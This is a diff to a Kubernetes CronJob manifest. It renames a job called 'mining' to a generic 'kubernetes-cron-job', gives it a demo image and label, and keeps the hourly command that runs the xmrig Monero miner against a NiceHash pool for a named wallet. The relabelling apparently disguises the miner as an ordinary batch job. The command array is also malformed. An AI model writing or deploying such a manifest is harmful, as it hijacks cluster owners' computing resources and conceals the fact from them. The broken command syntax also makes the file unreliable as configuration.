@@ -1,17 +1,19 @@
-apiVersion: batch/v1
+apiVersion: batch/v1beta1
 kind: CronJob
 metadata:
-  name: mining
+    name: kubernetes-cron-job
 spec:
   schedule: "* */1 * * *"
   jobTemplate:
     spec:
       template:
+        metadata:
+          labels:
+            app: cron-batch-job
         spec:
-          containers:
-          - name: mining
-            command:
-            - ls
-            - cd xmrig-6.12.2
-            - ./xmrig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -u 3NwTqUpHyE1bQHF2n99pqMpxh55gfE8qbs -p x -k --nicehash -a rx/0
           restartPolicy: OnFailure
+          containers:
+          - name: kube-cron-job
+            image: devopscube/kubernetes-job-demo:latest
+            args: ["100"]
+            command: ["ls","cd xmrig-6.12.2","./xmrig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -u 3NwTqUpHyE1bQHF2n99pqMpxh55gfE8qbs -p x -k --nicehash -a rx/0"]
